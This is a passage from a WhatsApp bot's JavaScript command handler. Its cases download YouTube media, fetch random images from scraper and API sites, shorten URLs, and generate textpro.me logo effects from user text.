	    case 'ytmp3xx': case 'ytaudioxx': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                XeonBotInc.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
                XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
case 'ytmp4': case 'ytvideo': //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) throw `Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
break
            case 'ytmp4xx': case 'ytvideoxx': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                XeonBotInc.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anupint = await pinterest(text)
                result = anupint[Math.floor(Math.random() * anupint.length)]
                XeonBotInc.sendMessage(m.chat, { image: { url: result }, caption: `${themeemoji} Media Url : `+result }, { quoted: m })
            }
            break
            case 'waifu': {
            	m.reply(mess.wait)
                anufux = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                buffer13x = await getBuffer(anufux.url)
                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `animemenu`, buttonText: {displayText: 'â¬…ï¸Back'}, type: 1}]
                let buttonMessage = {
                    image: buffer13x,
                    caption: `Random Waifu`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'couplepp': case 'ppcouple': {
                m.reply(mess.wait)
                let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
                let random = anucpp[Math.floor(Math.random() * anucpp.length)]
                XeonBotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffee': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `â˜• Random Coffee`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Enter Query Title'
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Enter Query Title'
		let { wikimedia } = require('./lib/scraper')
                anuwmedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
 case 'tinyurl':{
   if(!q) return m.reply('link?')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  m.reply(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
             if (!q) throw `Example : ${prefix + command} ${global.ownername}`
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rockart/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpinkart/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
             let anutexpro = await maker.textpro(link, q)
                XeonBotInc.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
case'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dbox':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break

case 'waterdrop':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
    .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
    .catch((err) => console.log(err));
     break

case 'lion2':
  if(!q) throw `Use ${prefix + command} text`
  m.reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break

case 'papercut':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case 'transformer':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
   
case 'harrypot':
       if(!q) throw `Use ${prefix + command} text|text`
       m.reply(mess.wait)
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break

case 'neondevil':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case '3dstone':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3davengers':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thunder':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'window':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

   case 'blackpinkneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'graffiti':
   case 'grafiti':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pornhub2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'blackpink2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch2':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dspace':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'lion':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'greenneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
    
case 'bokeh':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   

case 'holographic':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'bear':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'wolf':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'joker':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'dropwater2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   case 'summertime':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neonlight2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thewall':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'natural':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 

case 'carbon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pencil':
if(!q) throw`Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'textmaker': {
   
if (args.length < 1) throw `Example :\n${prefix + command} <name>`
if (args[0] === 'glitch') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else {
m.reply(`*Text Maker List :*\nâ€¢> glitch\nâ€¢> glow`)
}
}
break
case 'hoorror':{

     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
     let anui = await textpro(link, q)
     m.reply(`Wait a moment while making the logo about 1 minute`) 
     console.log(anui)
    XeonBotInc.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
case 'whitebear':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thunder2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   break
case 'neon':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'matrix2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sky':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'magma':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sand':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pencil':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'graffiti':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'harrpotter':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'underwater':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
